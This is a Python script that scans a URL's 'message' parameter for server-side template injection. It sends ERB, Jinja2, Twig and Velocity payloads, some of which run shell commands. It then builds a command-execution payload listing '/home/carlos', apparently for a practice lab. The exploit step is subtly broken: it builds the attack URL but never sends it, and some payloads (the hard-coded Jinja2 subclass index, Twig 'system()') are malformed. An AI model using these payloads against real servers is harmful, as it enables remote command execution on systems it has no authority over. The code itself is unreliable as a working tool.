import requests
from urllib.parse import quote

# List of common SSTI payloads for different template engines
payloads = {
    "erb": ["<%= 7*7 %>", "<%= system('ls') %>"],
    "jinja2": ["{{ 7*7 }}", "{{ ''.__class__.__mro__[1].__subclasses__()[59]('ls').read() }}"],
    "twig": ["{{ 7*7 }}", "{{ system('ls') }}"],
    "velocity": ["#set($x = 7 * 7)", "$x", "#set($x = 7 * 7) $x", "#set($cmd = 'ls')", "#foreach($i in [1])", "$i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd)", "#end"]
}

def check_and_exploit_ssti(url):
    param = "message"
    results = []

    # Function to check SSTI vulnerability
    def check_ssti(url, param):
        for engine, tests in payloads.items():
            for payload in tests:
                encoded_payload = quote(payload)
                test_url = f"{url}?{param}={encoded_payload}"

                try:
                    response = requests.get(test_url)
                    if response.status_code == 200 and "49" in response.text:
                        results.append(f"SSTI vulnerability detected with {engine} payload: {payload}")
                        return True, engine
                except requests.RequestException as e:
                    pass
        
        return False, None

    # Function to exploit SSTI vulnerability
    def exploit_ssti(url, param, engine, command):
        if engine not in payloads:
            return
        
        # Select appropriate payload for command execution
        if engine == "erb":
            exploit_payload = f"<%= system('{command}') %>"
        elif engine == "jinja2":
            exploit_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[59]('{command}').read() }}}}"
        elif engine == "twig":
            exploit_payload = f"{{{{ system('{command}') }}}}"
        elif engine == "velocity":
            exploit_payload = f"#set($cmd = '{command}') #foreach($i in [1]) $i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd) #end"
        else:
            return
        
        encoded_payload = quote(exploit_payload)
        exploit_url = f"{url}?{param}={encoded_payload}"

    # Detect and exploit SSTI
    ssti_detected, engine = check_ssti(url, param)
    if ssti_detected:
        # Replace 'ls /home/carlos' with the command you want to execute
        exploit_ssti(url, param, engine, "ls /home/carlos")

    return results

if __name__ == "__main__":
    target_url = input('Enter the URL to test for SSTI: ')
    results = check_and_exploit_ssti(target_url)
    for result in results:
        print(result)
